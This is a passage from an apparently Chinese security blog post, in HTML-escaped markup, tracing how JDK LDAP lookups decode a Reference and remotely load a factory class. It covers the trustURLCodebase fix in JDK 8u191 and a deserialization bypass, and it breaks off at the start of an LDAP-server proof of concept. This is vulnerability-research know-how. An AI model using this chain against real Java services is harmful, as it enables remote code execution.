&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//返回一个新的Reference对象引用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//获取第6个属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//省略部分代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//直接返回reference对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>LADP&lt;/code>服务的&lt;code>Reference&lt;/code>对象引用的获取和&lt;code>jndi&lt;/code>注入中的不太一样，&lt;code>jndi&lt;/code>是通过&lt;code>ReferenceWrapper_Stub&lt;/code>对象的&lt;code>getReference&lt;/code>方法获取&lt;code>reference&lt;/code>对象，而&lt;code>LADP&lt;/code>服务是根据传入的属性构造一个新的&lt;code>reference&lt;/code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为&lt;code>null&lt;/code>则直接返回新的&lt;code>reference&lt;/code>对象引用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#75af00">decodeReference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Attributes&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Attribute&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidAttributesException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; attribute is required&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//返回一个新的Reference对象引用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//获取第6个属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//省略部分代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//直接返回reference对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>LADP&lt;/code>服务的&lt;code>Reference&lt;/code>对象引用的获取和&lt;code>jndi&lt;/code>注入中的不太一样，&lt;code>jndi&lt;/code>是通过&lt;code>ReferenceWrapper_Stub&lt;/code>对象的&lt;code>getReference&lt;/code>方法获取&lt;code>reference&lt;/code>对象，而&lt;code>LADP&lt;/code>服务是根据传入的属性构造一个新的&lt;code>reference&lt;/code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为&lt;code>null&lt;/code>则直接返回新的&lt;code>reference&lt;/code>对象引用。&lt;/p>
&lt;p>&lt;code>reference&lt;/code>对象的三个属性:&lt;code>className&lt;/code>，&lt;code>classFactory&lt;/code>，&lt;code>classFactoryLocation&lt;/code>）如下所示：
&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png" alt="ldap_low5.png">&lt;/a>
接着会返回到&lt;code>decodeObject&lt;/code>方法调用处，然后再返回到&lt;code>LdapCtx&lt;/code>类的&lt;code>c_lookup&lt;/code>方法调用处，接着往下执行调用&lt;code>getObjectInstance&lt;/code>方法&lt;/p>
&lt;pre tabindex="0">&lt;code>protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
var2.setError(this, var1);
Object var3 = null;
Object var4;
try {
SearchControls var22 = new SearchControls();
var22.setSearchScope(0);
var22.setReturningAttributes((String[])null);
var22.setReturningObjFlag(true);
LdapResult var23 = this.doSearchOnce(var1, &amp;#34;(objectClass=*)&amp;#34;, var22, true);
this.respCtls = var23.resControls;
if (var23.status != 0) {
this.processReturnCode(var23, var1);
}
if (var23.entries != null &amp;amp;&amp;amp; var23.entries.size() == 1) {
LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
var4 = var25.attributes;
Vector var8 = var25.respCtls;
if (var8 != null) {
appendVector(this.respCtls, var8);
}
} else {
var4 = new BasicAttributes(true);
}
if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
//var3接收reference对象
var3 = Obj.decodeObject((Attributes)var4);
}
if (var3 == null) {
var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
}
} catch (LdapReferralException var20) {
LdapReferralException var5 = var20;
if (this.handleReferrals == 2) {
throw var2.fillInException(var20);
}
while(true) {
LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);
try {
Object var7 = var6.lookup(var1);
return var7;
} catch (LdapReferralException var18) {
var5 = var18;
} finally {
var6.close();
}
}
} catch (NamingException var21) {
throw var2.fillInException(var21);
}
try {
//调用了getObjectInstance方法
return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
} catch (NamingException var16) {
throw var2.fillInException(var16);
} catch (Exception var17) {
NamingException var24 = new NamingException(&amp;#34;problem generating object using object factory&amp;#34;);
var24.setRootCause(var17);
throw var2.fillInException(var24);
}
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>c_lookup&lt;/code>方法将&lt;code>var3&lt;/code>（&lt;code>reference&lt;/code>对象）传给了&lt;code>getObjectInstance&lt;/code>方法的&lt;code>refInfo&lt;/code>参数，继续跟进分析&lt;code>getObjectInstance&lt;/code>方法&lt;/p>
&lt;pre tabindex="0">&lt;code> public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx , Hashtable&amp;lt;?,?&amp;gt; environment, Attributes attrs) throws Exception {
ObjectFactory factory;
//获取对象工厂
ObjectFactoryBuilder builder = getObjectFactoryBuilder();
if (builder != null) {
// builder must return non-null factory
factory = builder.createObjectFactory(refInfo, environment);
if (factory instanceof DirObjectFactory) {
return ((DirObjectFactory)factory).getObjectInstance(
refInfo, name, nameCtx, environment, attrs);
} else {
return factory.getObjectInstance(refInfo, name, nameCtx,
environment);
}
}
// use reference if possible
Reference ref = null;
//判断reference对象是否为Reference
if (refInfo instanceof Reference) {
//转换为Reference类型
ref = (Reference) refInfo;
} else if (refInfo instanceof Referenceable) {
ref = ((Referenceable)(refInfo)).getReference();
}
Object answer;
//reference对象是否为空
if (ref != null) {
//获取工厂类名Exp
String f = ref.getFactoryClassName();
if (f != null) {
// if reference identifies a factory, use exclusively
//根据工厂类远程获取对象引用
factory = getObjectFactoryFromReference(ref, f);
if (factory instanceof DirObjectFactory) {
return ((DirObjectFactory)factory).getObjectInstance(
ref, name, nameCtx, environment, attrs);
} else if (factory != null) {
return factory.getObjectInstance(ref, name, nameCtx,
environment);
}
// No factory found, so return original refInfo.
// Will reach this point if factory class is not in
// class path and reference does not contain a URL for it
return refInfo;
} else {
// if reference has no factory, check for addresses
// containing URLs
// ignore name &amp;amp; attrs params; not used in URL factory
answer = processURLAddrs(ref, name, nameCtx, environment);
if (answer != null) {
return answer;
}
}
}
// try using any specified factories
answer = createObjectFromFactories(refInfo, name, nameCtx,
environment, attrs);
return (answer != null) ? answer : refInfo;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>getObjectInstance&lt;/code>方法将&lt;code>reference&lt;/code>对象转换为&lt;code>Reference&lt;/code>类型并判断&lt;code>reference&lt;/code>对象是否为空，如果不为空则从&lt;code>reference&lt;/code>引用中获取工厂类&lt;code>Exp&lt;/code>名字，接着调用&lt;code>getObjectFactoryFromReference&lt;/code>方法根据工厂类Exp名字获取远程调用对象。&lt;/p>
&lt;p>&lt;code>getObjectFactoryFromReference&lt;/code>方法实现如下：&lt;/p>
&lt;pre tabindex="0">&lt;code> static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException,InstantiationException, MalformedURLException {
Class&amp;lt;?&amp;gt; clas = null;
// Try to use current class loader
try {
//尝试先在本地加载Exp类
clas = helper.loadClass(factoryName);
} catch (ClassNotFoundException e) {
// ignore and continue
// e.printStackTrace();
}
// All other exceptions are passed up.
// Not in class path; try to use codebase
String codebase;
//获取远程地址
if (clas == null &amp;amp;&amp;amp; (codebase = ref.getFactoryClassLocation()) != null) {
try {
//loadClass方法远程加载Exp类
clas = helper.loadClass(factoryName, codebase);
} catch (ClassNotFoundException e) {
}
}
return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png" alt="ldap_low6.png">
可以看到&lt;code>LDAP&lt;/code>服务跟&lt;code>jndi&lt;/code>一样，会尝试先在本地查找加载&lt;code>Exp&lt;/code>类，如果本地没有找到&lt;code>Exp&lt;/code>类，那么&lt;code>getFactoryClassLocation&lt;/code>方法会获取远程加载的&lt;code>url&lt;/code>地址，如果不为空则根据远程&lt;code>url&lt;/code>地址使用类加载器&lt;code>URLClassLoader&lt;/code>来加载&lt;code>Exp&lt;/code>类，通过分析发现&lt;code>LDAP&lt;/code>服务的整个利用流程都没有&lt;code>URLCodebase&lt;/code>限制。
看一下整个调用站栈
&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/b956cc02-77f5-47b0-91fb-b50bd619731e.png" alt="ldap_low7.png">&lt;/p>
&lt;h3 id="高版本-1">高版本&lt;/h3>
&lt;p>在&lt;code>jdk8u191&lt;/code>以上的版本中修复了&lt;code>LDAP&lt;/code>服务远程加载恶意类这个漏洞，&lt;code>LDAP&lt;/code>服务在进行远程加载之前也添加了系统属性&lt;code>trustURLCodebase&lt;/code>的限制，通过分析在&lt;code>jdk8u191&lt;/code>版本发现，在&lt;code>loadClass&lt;/code>方法内部添加了系统属性&lt;code>trustURLCodebase&lt;/code>的判断，如果&lt;code>trustURLCodebase&lt;/code>为&lt;code>false&lt;/code>就直接返回&lt;code>null&lt;/code>，只有当&lt;code>trustURLCodebase&lt;/code>值为&lt;code>true&lt;/code>时才允许远程加载。
&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png" alt="ldap_low8.png">&lt;/a>&lt;/p>
&lt;p>在高版本 &lt;code>JDK&lt;/code> 中需要通过 &lt;code>com.sun.jndi.ldap.object.trustURLCodebase&lt;/code> 选项去启用。这个限制在 &lt;code>JDK 11.0.1&lt;/code>、&lt;code>8u191&lt;/code>、&lt;code>7u201&lt;/code>、&lt;code>6u211&lt;/code> 版本时加入，略晚于 &lt;code>RMI&lt;/code> 的远程加载限制。&lt;/p>
&lt;h4 id="序列化绕过">序列化绕过&lt;/h4>
&lt;p>&lt;code>com.sun.jndi.ldap.Obj.java#decodeObject&lt;/code>存在对&lt;code>JAVA_ATTRIBUTES[SERIALIZED_DATA]&lt;/code>的判断
&lt;a href="http://tttang.com/archive/1611/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">这里&lt;/a>提到 &lt;code>com.sun.jndi.ldap.Obj.java#decodeObject&lt;/code> 主要功能是解码从&lt;code>LDAP Server&lt;/code>来的对象，该对象可能是序列化的对象，也可能是一个&lt;code>Reference&lt;/code>对象。之前讲到&lt;code>Reference&lt;/code>对象，现在讲一下传来的是序列化的对象这种情况。
如果是序列化对象会调用&lt;code>deserializeObject&lt;/code>方法
&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png" alt="serialize1.png">&lt;/a>
进入&lt;code>deserializeObject&lt;/code>方法，发现会进行&lt;code>readObject&lt;/code>
&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png" alt="serialize2.png">&lt;/a>
看一下调用栈
&lt;a href="https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png">&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png" alt="serialize3.png">&lt;/a>&lt;/p>
&lt;h5 id="poc-1">poc&lt;/h5>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.alter.JNDI_LDAP.util.serializeObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.listener.InMemoryDirectoryServer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.listener.InMemoryListenerConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.sdk.Entry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.sdk.LDAPException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.sdk.LDAPResult&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.unboundid.ldap.sdk.ResultCode&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.net.ServerSocketFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.net.SocketFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.net.ssl.SSLSocketFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.InetAddress&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.MalformedURLException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.URL&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import static&lt;/span> &lt;span style="color:#111">com.alter.JNDI_LDAP.util.serializeObject.getPayload&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import static&lt;/span> &lt;span style="color:#111">com.alter.JNDI_LDAP.util.serializeObject.serializeObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Ldap&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">LDAP_BASE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;dc=example,dc=com&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">argsx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
